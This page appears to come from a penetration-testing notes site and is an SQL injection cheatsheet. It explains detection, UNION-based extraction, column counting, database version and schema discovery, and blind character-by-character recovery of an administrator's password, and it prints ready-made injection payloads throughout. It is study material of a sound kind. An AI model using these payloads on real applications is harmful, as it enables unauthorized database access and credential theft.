---
layout: page
title: SQL Injection Cheatsheet
parent: SQL Injection
grand_parent: Attacks
---
# {{ page.title }}
{: .no_toc }

<details open markdown="block">
  <summary>
    Table of contents
  </summary>
  {: .text-delta }
- TOC
{:toc}
</details>

---
## Detecting SQL Injection Vulnerabilities
Web scanner tools can be used for this purpose for quick and efficient detection but these can also be detected manually. This manual process consists of a systematic set of tests against every entry point in the application, these typically involve:
- Submitting single quote character `'` and looking for errors or anomalies
- Submitting SQL-specific syntax an observable chance could be evaluated
- Submitting Boolean conditions and looking for differences `OR 1=1` and `OR 1=2`
- Submitting payloads designed to trigger time delays when executed and observing response times
- Performing [OAST](https://alipali737.github.io/pen-test-docs/Knowledge/Testing/Application%20Security%20Testing%20Methods.html#out-of-band-application-security-testing-oast) methods to trigger an out-of-band network interaction when executed within a SQL query

## SQL Injection in Different Parts of the Query
Generally, most SQLi vulnerabilities arise within the `WHERE` clause of a `SELECT` query. However, SQLi vulnerabilities can in principle occur at any location within the query, and within different query types. The most common other locations are:
- In `UPDATE` statements, within the *updated values* or the `WHERE` clause.
- In `INSERT` statements, within the *inserted values*.
- In `SELECT` statements, within the table or column name.
- In `SELECT` statements, within the `ORDER BY` clause.

## SQL Injection Type Examples
There are many SQLi vulnerabilities, attacks, and techniques, which all arise in different situations. Some more common ones include:
- *Retrieving hidden data*, where you modify a SQL query to return additional results.
- *Subverting application logic*, where you can change a query to interfere with the application's logic.
- *[UNION attacks](https://alipali737.github.io/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#union-attacks)*, where you can retrieve data from different database tables.
- *[Blind SQL injection](https://alipali737.github.io/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#blind-sql-injection-vulnerabilities)*, where the results of a query you control are not returned in the application's responses.

## Basic SQL Statement 
A large amount of SQL statements on something like a product search page will be structured similarly too:
{% highlight sql %}
SELECT * FROM {some-table(s)} WHERE {some-field} = '{some-query}'

SELECT * FROM products WHERE categories = 'Gifts' AND released = 1
{% endhighlight %}

## Handling Different SQL System Syntax
There is a variety of SQL platforms available now and each use slightly different SQL syntax to carry out operations. A useful cheatsheet can be found on the [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) here that details the different syntax for each main platform. There is also a fairly comprehensive cheat sheet [here](https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet) for different systems.

## Basic Evaluate True (Return All)
A very basic way to exploit a statement like the above would be to break out of the quotes and then add a statement that always evaluates as true and comment out the final section of the statement.

Adding a simple `' OR 1=1--`, escapes the categories field value by ending the quotes, adds an `OR` statement followed by a statement that always evaluates as True. Finally we use a `--` to comment out any other statements following in the query.

{% highlight sql %}
SELECT * FROM products WHERE categories = '' OR 1=1-- ' AND released = 1
{% endhighlight %}

## Determining the number of columns in a table
Finding out the number of columns in a table can be very useful for construction a [UNION attack](https://portswigger.net/web-security/sql-injection/union-attacks) as to `UNION` another table to the result you need to match the number of columns. This means before we can create this attack we need to determine how many columns are in the current table.

To do this we can use the `ORDER BY` command to determine how many columns are in the table. By escaping a parameter and then adding an `ORDER BY 1--` you can control the order of the results by sorting based on the column index specified.

This means that you can increase the number until you get a server error (indicating that you have tried to select a column index out of range) allowing you to determine the number of columns in a table.

{% highlight sql %}
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc
{% endhighlight %}

## UNION Attacks
`UNION` Attacks are where you use a `UNION` command to attach a secondary/multiple more statements to the end of an SQL command to retrieve information from another table or different columns.

Some key requirements for a UNION attack is that the number of columns that are being appended to the bottom of the original result have to match. You can determine the number of columns of a table using a method described in [Determining the number of columns in a table](https://alipali737.github.io/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html#determining-the-number-of-columns-in-a-table)

More information can also be found on the [PortSwigger UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks) page.

#### Append a blank table to the end of the list with NULL values
{% highlight sql %}
' UNION SELECT NULL,NULL,NULL--
{% endhighlight %}

#### Finding columns that have a useful data type
{% highlight sql %}
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
{% endhighlight %}

#### Retrieving information from another table
- For this you must make sure that you follow the appropriate number of columns needed for the UNION to work
- This also requires you to know the column names and table name for the data you wish to access
{% highlight sql %}
' UNION SELECT username, password FROM users--
{% endhighlight %}

#### Retrieving multiple values within a single column
- If you wish to return data that is more columns that the original query you can concatinate the data from the extracted table into a single column
- This could also be required if you only have limited columns that support the data type you require
{% highlight sql %}
' UNION SELECT username || '-' || password FROM users--
' UNION SELECT NULL,username || '-' || password FROM users--
{% endhighlight %}

## Discovering System Information
- There is often varibles and tables that come as default for many SQL implementations that details the versions and technologies used
- These are specific to the languag but can be very helpful for recon on the target

{% highlight sql %}
-- Oracle:
SELECT banner FROM v$version
SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’
SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’
SELECT version FROM v$instance
{% endhighlight %}

The queries to determine the database version for some popular database types are as follows:

|   |   |
|---|---|
|Database type|Query|
|Microsoft, MySQL|`SELECT @@version`|
|Oracle|`SELECT * FROM v$version`|
|PostgreSQL|`SELECT version()`|

For most database types (notably excluding Oracle) a set of views called the *Information schema* can provide database information:
{% highlight sql %}
SELECT * FROM information_schema.tables
{% endhighlight %}

This will return something like this:

| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE |
| ------------- | ------------ | ---------- | ---------- |
| MyDatabase    | dbo          | Products   | BASE TABLE |
| MyDatabase    | dbo          | Users      | BASE TABLE |
| OtherDatabase | public       | Feedback   | BASE TABLE | 

Finding columns is simple after this:
{% highlight sql %}
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
{% endhighlight %}

Equivalent information for *Oracle*:
{% highlight sql %}
SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = 'Users'
{% endhighlight %}

## Blind SQL Injection Vulnerabilities
A blind SQL injection is where the application doesn't return the results of the query or the details of any database errors within its response. These vulnerabilities can still be exploited to access unauthorized data, however, techniques are generally more complicated and difficult to perform.

Depending on the nature of the vulnerability, the following techniques can be used to exploit blind SQLi vulnerabilities:
- You can change the logic of the query to trigger a detectable difference in the application's response depending on the truth of a single condition. This might involve injecting a new condition into some Boolean logic, or conditionally triggering an error such as a divide-by-zero.
- You can conditionally trigger a time delay in the processing of the query, allowing you to infer the truth of the condition based on the response time.
- You can trigger an out-of-band network interaction, using [OAST](https://alipali737.github.io/pen-test-docs/Knowledge/Testing/Application%20Security%20Testing%20Methods.html#out-of-band-application-security-testing-oast) techniques. Often you can directly exfiltrate data via the out-of-band channel eg. placing the data into a DNS lookup for a domain you control.

A nice way to determine the length of a field could be by iterating over a condition of its length:
{% highlight sql %}
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a'
{% endhighlight %}

For cracking the value you can repeat a similar technique by testing each letter one by 1:
{% highlight sql %}
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='b'
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='c'
...
' AND (SELECT SUBSTRING(password,15,1) FROM users WHERE username='administrator')='a'
' AND (SELECT SUBSTRING(password,16,1) FROM users WHERE username='administrator')='a'
{% endhighlight %}

This can then be automated in a simple script to determine the length and then crack the password (could even create a thread for each character and speed it up) or use a system like Burp Intruder for more basic automation

## Second-order SQL Injection
First-order SQL injection is where an application takes user input from an HTTP request and incorporates the input into an SQL query in an unsafe way.

Second-order injections (also known as **stored SQL injection**), is where the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability arises at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into an SQL query in an unsafe way.

![Second-order SQL injection demo]({{ site.baseurl }}/assets/images/sql-injection/second-order-sql-injection.svg)

Second-order SQL injection often arises when developers are aware of SQL injection vulnerabilities, so they safely handle the initial placement of input into the database. However, later when processing the data, which has been deemed to be safe, it is handled in an unsafe way, because the developer wrongly deems it to be trusted.